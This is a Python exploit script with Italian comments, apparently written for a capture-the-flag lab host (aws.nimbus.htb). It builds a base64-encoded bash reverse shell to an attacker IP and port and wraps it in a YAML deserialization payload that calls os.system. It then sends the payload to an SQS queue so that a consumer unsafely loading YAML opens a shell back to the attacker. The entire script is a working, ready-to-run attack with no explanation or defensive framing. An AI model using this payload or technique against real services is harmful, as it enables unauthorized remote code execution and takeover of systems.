#!/usr/bin/env python3
import base64
import boto3
from botocore.exceptions import ClientError

# ========================================================
# OPERAZIONE: CONFIGURA IL TUO IP E LA PORTA DI NETCAT
# ========================================================
ATTACKER_IP = "10.10.14.117"
ATTACKER_PORT = "1234"
# ========================================================

ENDPOINT = "http://aws.nimbus.htb"
REGION = "us-east-1"
QUEUE_URL = "http://floci:4566/847219365028/nimbus-jobs"

# 1. Generazione dinamica della Reverse Shell in Base64
raw_shell = f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1\n"
b64_shell = base64.b64encode(raw_shell.encode()).decode()

# 2. Creazione del Payload YAML pulito (SENZA json.dumps successivo)
PAYLOAD = f"!!python/object/apply:os.system ['echo {b64_shell} | base64 -d | bash']"

# 3. Inizializzazione del client AWS SQS
sqs = boto3.client(
    "sqs",
    endpoint_url=ENDPOINT,
    region_name=REGION,
)

print(f"[*] Destinazione Target: {ENDPOINT}")
print(f"[*] Invio Reverse Shell verso -> {ATTACKER_IP}:{ATTACKER_PORT}")
print("[*] Stringa Base64 generata:", b64_shell)
print("-" * 50)

try:
    # 4. Spedizione del testo nativo senza alterazioni JSON
    response = sqs.send_message(
        QueueUrl=QUEUE_URL,
        MessageBody=PAYLOAD
    )

    print("[+] SQS Exploit inviato con successo!")
    print(f"    MessageId : {response['MessageId']}")
    print(f"    MD5       : {response['MD5OfMessageBody']}")
    print("\n[!] Controlla la tua finestra di Netcat!")

except ClientError as e:
    print("\n[-] Errore delle API di AWS/LocalStack:")
    print(e)
except Exception as e:
    print(f"\n[-] Errore imprevisto nello script: {e}")
